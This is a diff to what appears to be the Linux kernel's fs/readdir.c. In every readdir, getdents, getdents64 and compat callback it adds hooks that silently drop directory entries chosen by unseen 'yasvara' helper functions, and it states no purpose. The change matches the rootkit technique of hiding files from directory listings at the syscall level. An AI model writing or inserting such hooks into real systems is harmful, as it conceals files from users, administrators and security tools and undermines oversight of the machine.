@@ -20,6 +20,7 @@
 #include <linux/syscalls.h>
 #include <linux/unistd.h>
 #include <linux/compat.h>
+#include <linux/yasvara_hide.h>
 #include <linux/uaccess.h>
 
 /*
@@ -176,6 +177,7 @@ struct readdir_callback {
 	struct dir_context ctx;
 	struct old_linux_dirent __user * dirent;
 	int result;
+	u8 yasvara_dir_kind;
 };
 
 static bool fillonedir(struct dir_context *ctx, const char *name, int namlen,
@@ -186,6 +188,9 @@ static bool fillonedir(struct dir_context *ctx, const char *name, int namlen,
 	struct old_linux_dirent __user * dirent;
 	unsigned long d_ino;
 
+	if (unlikely(buf->yasvara_dir_kind &&
+		     yasvara_should_hide_dirent_n(buf->yasvara_dir_kind, name, namlen)))
+		return true;
 	if (buf->result)
 		return false;
 	buf->result = verify_dirent_name(name, namlen);
@@ -228,6 +233,7 @@ SYSCALL_DEFINE3(old_readdir, unsigned int, fd,
 	if (!fd_file(f))
 		return -EBADF;
 
+	buf.yasvara_dir_kind = yasvara_classify_hide_dir(&fd_file(f)->f_path);
 	error = iterate_dir(fd_file(f), &buf.ctx);
 	if (buf.result)
 		error = buf.result;
@@ -255,6 +261,7 @@ struct getdents_callback {
 	int prev_reclen;
 	int count;
 	int error;
+	u8 yasvara_dir_kind;
 };
 
 static bool filldir(struct dir_context *ctx, const char *name, int namlen,
@@ -268,6 +275,9 @@ static bool filldir(struct dir_context *ctx, const char *name, int namlen,
 		sizeof(long));
 	int prev_reclen;
 
+	if (unlikely(buf->yasvara_dir_kind &&
+		     yasvara_should_hide_dirent_n(buf->yasvara_dir_kind, name, namlen)))
+		return true;
 	buf->error = verify_dirent_name(name, namlen);
 	if (unlikely(buf->error))
 		return false;
@@ -321,6 +331,7 @@ SYSCALL_DEFINE3(getdents, unsigned int, fd,
 	if (!fd_file(f))
 		return -EBADF;
 
+	buf.yasvara_dir_kind = yasvara_classify_hide_dir(&fd_file(f)->f_path);
 	error = iterate_dir(fd_file(f), &buf.ctx);
 	if (error >= 0)
 		error = buf.error;
@@ -343,6 +354,7 @@ struct getdents_callback64 {
 	int prev_reclen;
 	int count;
 	int error;
+	u8 yasvara_dir_kind;
 };
 
 static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
@@ -355,6 +367,9 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 		sizeof(u64));
 	int prev_reclen;
 
+	if (unlikely(buf->yasvara_dir_kind &&
+		     yasvara_should_hide_dirent_n(buf->yasvara_dir_kind, name, namlen)))
+		return true;
 	buf->error = verify_dirent_name(name, namlen);
 	if (unlikely(buf->error))
 		return false;
@@ -404,6 +419,7 @@ SYSCALL_DEFINE3(getdents64, unsigned int, fd,
 	if (!fd_file(f))
 		return -EBADF;
 
+	buf.yasvara_dir_kind = yasvara_classify_hide_dir(&fd_file(f)->f_path);
 	error = iterate_dir(fd_file(f), &buf.ctx);
 	if (error >= 0)
 		error = buf.error;
@@ -433,6 +449,7 @@ struct compat_readdir_callback {
 	struct dir_context ctx;
 	struct compat_old_linux_dirent __user *dirent;
 	int result;
+	u8 yasvara_dir_kind;
 };
 
 static bool compat_fillonedir(struct dir_context *ctx, const char *name,
@@ -444,6 +461,9 @@ static bool compat_fillonedir(struct dir_context *ctx, const char *name,
 	struct compat_old_linux_dirent __user *dirent;
 	compat_ulong_t d_ino;
 
+	if (unlikely(buf->yasvara_dir_kind &&
+		     yasvara_should_hide_dirent_n(buf->yasvara_dir_kind, name, namlen)))
+		return true;
 	if (buf->result)
 		return false;
 	buf->result = verify_dirent_name(name, namlen);
@@ -486,6 +506,7 @@ COMPAT_SYSCALL_DEFINE3(old_readdir, unsigned int, fd,
 	if (!fd_file(f))
 		return -EBADF;
 
+	buf.yasvara_dir_kind = yasvara_classify_hide_dir(&fd_file(f)->f_path);
 	error = iterate_dir(fd_file(f), &buf.ctx);
 	if (buf.result)
 		error = buf.result;
@@ -507,6 +528,7 @@ struct compat_getdents_callback {
 	int prev_reclen;
 	int count;
 	int error;
+	u8 yasvara_dir_kind;
 };
 
 static bool compat_filldir(struct dir_context *ctx, const char *name, int namlen,
@@ -520,6 +542,9 @@ static bool compat_filldir(struct dir_context *ctx, const char *name, int namlen
 		namlen + 2, sizeof(compat_long_t));
 	int prev_reclen;
 
+	if (unlikely(buf->yasvara_dir_kind &&
+		     yasvara_should_hide_dirent_n(buf->yasvara_dir_kind, name, namlen)))
+		return true;
 	buf->error = verify_dirent_name(name, namlen);
 	if (unlikely(buf->error))
 		return false;
@@ -572,6 +597,7 @@ COMPAT_SYSCALL_DEFINE3(getdents, unsigned int, fd,
 	if (!fd_file(f))
 		return -EBADF;
 
+	buf.yasvara_dir_kind = yasvara_classify_hide_dir(&fd_file(f)->f_path);
 	error = iterate_dir(fd_file(f), &buf.ctx);
 	if (error >= 0)
 		error = buf.error;
